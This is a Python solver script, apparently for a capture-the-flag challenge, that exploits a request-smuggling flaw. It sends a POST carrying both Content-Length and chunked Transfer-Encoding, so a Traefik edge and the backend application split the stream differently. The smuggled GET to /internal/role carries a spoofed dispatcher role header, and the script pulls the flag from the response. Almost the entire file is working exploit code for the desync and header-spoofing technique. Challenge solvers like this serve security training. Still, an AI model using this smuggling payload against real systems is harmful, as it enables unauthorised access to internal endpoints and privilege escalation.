#!/usr/bin/env python3
"""Tracking solver: send one request that the edge and the application read differently.

The instance endpoint is TLS (tcp-ssl expose), so the raw socket is wrapped before
the bytes go out. Traefik terminates TLS and forwards the stream untouched, which is
exactly what lets the two parsers disagree.
"""

from __future__ import annotations

import argparse
import re
import socket
import ssl
import sys
from urllib.parse import urlparse

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

FILLER = b"id=PS-1042&"
SMUGGLED = (
    b"GET /internal/role HTTP/1.1\r\n"
    b"Host: t\r\n"
    b"X-PackSwift-Role: dispatcher\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


def build_request() -> bytes:
    chunk = FILLER + SMUGGLED
    hex_size = f"{len(chunk):x}".encode()
    # The application reads this many bytes after the header block, which ends exactly
    # at the first byte of the request carried inside the chunked body.
    length = len(hex_size) + 2 + len(FILLER)
    head = (
        b"POST /track HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Content-Length: " + str(length).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
    )
    return head + hex_size + b"\r\n" + chunk + b"\r\n0\r\n\r\n"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    args = parser.parse_args()

    parsed = urlparse(args.base_url)
    if parsed.hostname is None:
        print("solver: the base URL has no host", file=sys.stderr)
        return 1
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https" or port == 9450

    data = b""
    try:
        with socket.create_connection((parsed.hostname, port), timeout=10) as raw:
            sock = raw
            if use_tls:
                context = ssl.create_default_context()
                sock = context.wrap_socket(raw, server_hostname=parsed.hostname)
            sock.settimeout(10)
            sock.sendall(build_request())
            while True:
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
    except OSError as error:
        print(f"solver: request failed: {error}", file=sys.stderr)
        return 1

    match = FLAG.search(data.decode("latin-1", "replace"))
    if not match:
        print("solver: no flag in the response", file=sys.stderr)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
